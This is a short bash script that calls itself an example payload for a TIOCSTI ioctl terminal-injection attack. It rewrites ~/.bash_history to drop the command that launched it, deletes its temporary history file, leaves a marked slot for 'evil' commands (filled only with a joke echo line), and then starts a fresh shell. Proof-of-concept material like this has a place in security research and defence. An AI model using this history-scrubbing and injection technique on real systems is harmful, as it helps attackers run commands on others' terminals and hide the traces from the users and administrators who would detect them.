#example of script to launch with ioctl(TIOCSTI) attack, that attempts to hide itself in history
HISTFILE=/tmp/myhist
history -a
head -n -1 /tmp/myhist > ~/.bash_history
rm /tmp/myhist

#insert "evil" commands here
echo 'I solemnly swear that i am up to no good'
#

exec bash
